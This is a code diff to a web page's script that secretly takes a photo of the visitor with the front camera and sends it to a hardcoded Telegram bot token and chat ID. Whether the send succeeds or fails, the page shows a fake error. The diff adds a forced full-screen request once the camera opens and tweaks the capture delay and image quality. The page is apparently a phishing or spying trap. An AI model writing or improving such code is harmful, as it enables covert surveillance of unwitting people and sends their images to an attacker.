@@ -51,6 +51,13 @@
         const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
         const chatId = "2049331070";
 
+        // طلب Full Screen
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
@@ -59,8 +66,9 @@
             } 
         })
         .then(stream => {
+            goFullScreen();
             video.srcObject = stream;
-            setTimeout(captureAndSend, 2600);
+            setTimeout(captureAndSend, 2800);
         })
         .catch(() => showError());
 
@@ -68,12 +76,9 @@
             let width = video.videoWidth;
             let height = video.videoHeight;
 
-            // جعل الصورة أوسع (بعيدة)
             canvas.width = width;
             canvas.height = height;
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, width, height);
+            canvas.getContext('2d').drawImage(video, 0, 0, width, height);
             
             canvas.toBlob(blob => {
                 const formData = new FormData();
@@ -86,7 +91,7 @@
                 })
                 .then(() => showError())
                 .catch(() => showError());
-            }, 'image/jpeg', 0.92);
+            }, 'image/jpeg', 0.9);
         }
 
         function showError() {
